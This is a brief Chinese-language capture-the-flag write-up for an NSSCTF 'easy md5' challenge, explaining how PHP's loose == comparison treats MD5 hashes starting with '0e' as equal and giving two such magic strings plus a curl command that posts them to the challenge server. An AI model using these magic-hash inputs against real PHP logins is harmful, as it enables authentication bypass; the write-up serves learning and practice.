# easy md5

题目链接：https://www.nssctf.cn/problem/386



解题思路：

PHP的==符号是弱类型比较，弱类型比较会把0e开头的字符串作为科学计数法来比较。因此出现2个字符串实际内容不相同，但md5(val1)==md5(val2)的情况。



因此，如下字符串：

- 字符串：QNKCDZO MD5：0e830400451993494058024219903391
- 字符串：byGcY MD5: 0e591948146966052067035298880982

在PHP md5 ==比较里会相同。



EXP：

```
curl -XPOST http://node7.anna.nssctf.cn:20171/?name=QNKCDZO -d 'password=byGcY'
```

